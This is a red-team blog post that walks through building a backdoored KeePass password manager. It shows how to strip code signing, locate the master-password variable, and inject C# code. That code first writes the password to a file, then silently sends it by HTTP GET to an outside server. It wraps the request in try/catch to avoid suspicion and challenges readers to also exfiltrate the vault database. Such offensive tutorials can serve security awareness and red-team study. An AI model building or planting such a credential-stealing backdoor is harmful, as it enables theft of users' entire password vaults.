---

layout: post

title: Backdooring KeePass for Fun and Profit

gh-badge:

- star

- fork

- follow

tags:

- Malware Development

- C#

- Programming

- Red Team

- Windows

- Cyber Security

comments: true

published: true

date: '2023-08-30'

---

Hey everyone!

Welcome back to another blog post. August is swiftly coming to a close and I really wanted to try to get one more post out before the month closes. I'm writing this on 8/30 for reference. No idea how long this is going to take, but we're going to run with it.

For those of you who don't know, I'm now in an internal red team role, this let's me get extra creative as I know our environment really well, for reference, I've worked at the company for 3~ years now and I'm still finding fun and creative ways to bonk people. So - the other day I had my KeePass vault open and thought "Wow, if someone really wanted to, they could yoink my key right out of memory and have most of my passwords". Then I thought "how classic, dumping memory. I'm sure there'd be a more stealthy way". I'm sure there is, so that's what I'll be exploring in todays blog post. 

### Sections & Pre-Reqs
This post will be broken down into 4 different sections:
- Improvise Adapt, Overcome
- Analyzing KeePass
- POC \|\| GTFO
- Silent Exfiltration via the Web

In order to get the most out of this post, you should have some prior experience with C#, some basic knowledge of how Password Managers work and an adversarial mindset. Pretty straight forward. Let's dive into it :D


### Improvise, Adapt, Overcome
My original idea was to create a backdoored version of KeePass that would send a GET/POST request to an attacker controlled web server. This in theory should be relatively easy! KeePass is FOSS and even OSI certified so this should be a piece of cake! So, naturally the first step would be to acquire the source code which can be found at the bottom of [KeePass' downloads page](https://keepass.info/download.html).  Unzipping it, it's a .sln project, how nice! Included there's also a ReadMe_PFX.txt file... How interesting... It reads:

```
All projects contain dummy PFX files. These PFX files are NOT
the ones with which the KeePass distributions are signed, these
are kept secret.

In order to unlock the private keys of the dummy PFX files,
use:

    "123123"  (without the quotes)

Official KeePass distributions are signed with private keys.
You can find the corresponding public keys in the

    Ext/PublicKeys
    
directory.
```

Uh oh. That's a problem... Will this derail our plan? Eh... I'm not going to let it. We'll keep on pushing forward! Sure, it's not really as cool as hijacking a DLL, hooking some APIs to spit out the password, but I'm not going to let a silly little signature stop me. Who even checks these things anyways! *disclaimer, that is a joke. digital signatures are very important and can be the difference in software running or software being quarantined by AV/EDR or even executing*. I still think it would be fun to go through with this. So, how can we remove the digital signature? This process is relatively simple, we just have to open the sln up in Visual Studio. In the Solution Explorer window, you should have 3 projects. 

![[Pasted image 20230831005723.png]](https://blog.spookysec.net/img/Pasted image 20230831005723.png)

Right click a project and select "Properties", a new window should appear:

![[Pasted image 20230831005750.png]](https://blog.spookysec.net/img/Pasted image 20230831005750.png)

On the right side, you'll see a tab called "Signing". Select that. A new window will open related to code signing:

![[Pasted image 20230831005824.png]](https://blog.spookysec.net/img/Pasted image 20230831005824.png)

Uncheck the "Sign this assembly" box. Repeat the process for each of the projects. There's one more thing we have to do. In the KeePass project, select the "Build Events" tab. You should see "Post-build event command line". This references a application called "sgen". This will also have some fun signature related stuff that may prevent us from compiling. I found it works with just these as arguments:

```
"$(FrameworkSDKDir)bin\sgen.exe" /assembly:"$(TargetPath)" /force /nologo /compiler
```

Now you should be able to right click each project and select "Rebuild". Compilation *should* complete without Errors. If it doesn't - Read the errors and make sure sgen is in the expected location.

At this point, we should now have a working copy of KeePass that is **not** signed!

![[Pasted image 20230831010347.png]](https://blog.spookysec.net/img/Pasted image 20230831010347.png)

Notice the one on the left does not have a Digital Signatures tab and the one on the right does. Take a guess at which ours is! 
### Analyzing KeePass
Reverse Engineering software is hard, I'll be the first to say it, but oh boy is it a lot easier when the software you're REing is FOSS! Fortunately for us it is. We're going to use my favorite tactic called "Using some information we know to correlate things to information we don't know!". What we do know is the dialogue that KeePass prompts us for when we input our password:

![[Pasted image 20230831012957.png]](https://blog.spookysec.net/img/Pasted image 20230831012957.png)

In this case, "Master password:". This should help us easily find the UI form that *should* reference the name of some variable or struct we could use to siphon data. My favorite text editor in the whole world is... not VS Code but Sublime. RegEx support is awesome, super fast, it does everything I need it to and more. We're going to use one of my favorite hot keys "Ctrl+Shift+F" to search all our files to find the string "Master Password".

![[Pasted image 20230831013918.png]](https://blog.spookysec.net/img/Pasted image 20230831013918.png)

Out of 1468 files we have 2 occurrences of "Master password:" in KeePass\\Forms\\KeyPromptForm.Designer.cs and KeePass\\Forms\\KeyCreationForm.Designer.cs files. Let's take a peak at those. Clicking the file in Visual Studio shows the compiled design, neat. I never knew that.

![[Pasted image 20230831014328.png]](https://blog.spookysec.net/img/Pasted image 20230831014328.png)

It looks like KeyPromptForm.cs is what we're after. Right clicking it and selecting "View Code" will show us the source. We can see in our prior screenshots, we're looking at what I'm going to call the m_cbPassword struct. I don't know if this is right, but that's what I'm going to call it. We'll want to see if we can identify what happens when this gets submitted. Searching the KeyPromptForm.cs file, we can see a function called OnBtnOK. Seems OK, a small function that calls another function called "KeyFromUI". This tracks. Clicking on the Function, we can see a declaration:

```cs
internal static CompositeKey KeyFromUI(CheckBox cbPassword,
	PwInputControlGroup icgPassword, SecureTextBoxEx stbPassword,
	CheckBox cbKeyFile, ComboBox cmbKeyFile, CheckBox cbUserAccount,
	IOConnectionInfo ioc, bool bSecureDesktop)
```

This can be found in KeyUtils.cs on lines 113-116. stbPassword seems to be a relatively interesting variable, its likely that this contains the object we seek - the password! 

### POC || GTFO

![[Pasted image 20230831020308.png]](https://blog.spookysec.net/img/Pasted image 20230831020308.png)

Looking at the surrounding function, we can see stbPassword is converted to UTF-8, a more user friendly format. We can also see some attempted validation, so if we want to be extra sure we've got the right thing, we can embed our GET/POST request in the function. As a Proof of Concept, let's just grab *all* the data a user enters. For simplicity of testing to ensure we've got the right field, we can just write the data out to a file. 
```cs
if(cbPassword.Checked)
{
	pbPasswordUtf8 = stbPassword.TextEx.ReadUtf8();
	...
	FileStream fs = File.Open("C:\\Users\\YOURUSER\\Downloads\\notapass.txt", FileMode.Append);
	fs.Write(pbPasswordUtf8,0, pbPasswordUtf8.Length);
	fs.Close();
	...
	if(bNewKey)
	{
		if(!icgPassword.ValidateData(true)) return null;
```
Compiling the code and running KeePass we are presented with roughly what we expect. No visual differences. Now, the magic is supposed to happen after we input the password and press the "OK" button (remember, we got this function from OnBtnOK).

![[Pasted image 20230831020059.png]](https://blog.spookysec.net/img/Pasted image 20230831020059.png)

We've entered our super secret password and pressing OK creates a new file!

![[Pasted image 20230831020140.png]](https://blog.spookysec.net/img/Pasted image 20230831020140.png)

Bingo. We got it. So, now we know definitely what variable contains the password. It should be trivial to send an HTTP request to our site to exfil our data. I'd recommend deleting the code in case you decide you want to actually weaponize this in prod... Just don't want to leave that laying around ;D

### Silent Exfiltration via the Web
For our POC, we'll want to move down lower to grab the verified password and not just any password. I think line 147~ (in the IF statement)) is a good place for this, right before the data gets zero'd out from memory. Using the HttpWebRequest library, we can craft a simple HTTP request. The code looks something like so:
```cs
if (cbKeyFile.Checked) strKeyFile = cmbKeyFile.Text;
	...
	try
	{
		string url = "https://xss.bananaisu.com/index.html?kp=" + Encoding.UTF8.GetString(pbPasswordUtf8);
		HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
		request.Method = "GET";
		request.GetResponse();
	}
	catch
	{}
	...
	return CreateKey(pbPasswordUtf8, strKeyFile, cbUserAccount.Checked,
	ioc, bNewKey, bSecureDesktop);
	}

```

Pretty boilerplate, first line is our URL - the bytes like object is converted to a full fledge string (it didn't matter in our previous snippet because we were writing bytes out to a file). The second line actually creates the GET request, third sets the method, and lastly the forth sends the GET request by retrieving the response from the Web Server. I would highly recommend wrapping this in a try catch statement to avoid suspicion if the Web Server is not alive/dns records change, etc. etc. The last thing you want is an error message!

We can test this by re-compiling KeePass and hopping onto our Web Server which will be expecting the payload. Now, we can try entering our password to unlock our vault and...

![[Pasted image 20230831030629.png]](https://blog.spookysec.net/img/Pasted image 20230831030629.png)

Success! We've got a relatively silent password stealer. So, where do we go from here? Great question dear reader - assuming you've managed to compromise a users device *and* install a backdoored version of KeePass (like this one), you probably can access their KeePass vault file as well.

Though, role play with me for a second: You're on a Red Team engagement and you happened to have poor OpSec this week. You were off your game and the SOC quarantined your beacon. Thankfully, they missed your backdoored version of KeePass. While you've lost access to the device, you still have this. A key is useless without a door. My challenge for you (If you've made it this far) is to further modify KeePass and exfiltrate the KeePass Database file as well. If you get a working POC, tag me on Twitter :D 

Anyways, that's all I've got for you today. Thanks for the continued support, it means the world to me <3

~ Ronnie
